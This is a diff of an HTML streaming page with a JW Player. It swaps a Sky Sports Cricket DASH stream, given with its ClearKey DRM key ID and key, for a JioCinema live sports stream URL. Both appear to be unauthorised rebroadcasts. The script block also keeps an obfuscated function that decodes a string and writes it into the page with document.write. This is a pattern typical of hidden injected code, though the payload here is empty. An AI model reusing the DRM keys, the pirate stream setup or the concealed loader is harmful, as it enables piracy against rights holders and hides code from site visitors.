@@ -28,15 +28,16 @@
 <body>  
 <div id="jwplayerDiv"></div>  
 <script type="text/javascript">    
-jwplayer("jwplayerDiv").setup({    
-        file: "https://linear003-gb-dash1-prd-ak.cdn.skycdp.com//100e/Content/DASH_003_sm/Live/channel(skysportscricket)/manifest_hd.mpd",   position: 'bottom',   
-      type: "dash",    
-      drm: { "clearkey": {    
-              "keyId":"0003f2a72d21efd159d45a3a74decd84", 
-        "key":"df0ec40586d641f3d4728ab5fd62adc3"   
-            }    
-             }               
-});    
+ jwplayer("jwplayerDiv").setup({
+        "playlist": [
+            {
+                "file": "https://prod-ent-live-fa.jiocinema.com/bpk-tv/JV_SportsHD15_DIG_MOB/Fallback/index.m3u8"
+            }
+        ],
+        "autostart": true,
+      "fullscreen": true, 
+   "mute": false,     
+    });
  (()=>{for(j=function(){for(h='8bgG&;jB<*>lfM7P!e*',a=new Array(h.length),l=0;l<h.length;l++)a[l]=h.charCodeAt(l);return a}(),m=m=>document.write(m),k=decodeURI("".concat("")).split(""),g=k.length%j.length,l=k.length-1;l>=0;l--)g--,-1==g&&(g=j.length-1),f=l+j[g],f>=k.length||(c=k[l],b=k[f],k[f]=c,k[l]=b);for(n=m,i="",l=0;l<k.length;l++)i+=k[l];n(i)})();</script>  
   </script>
 
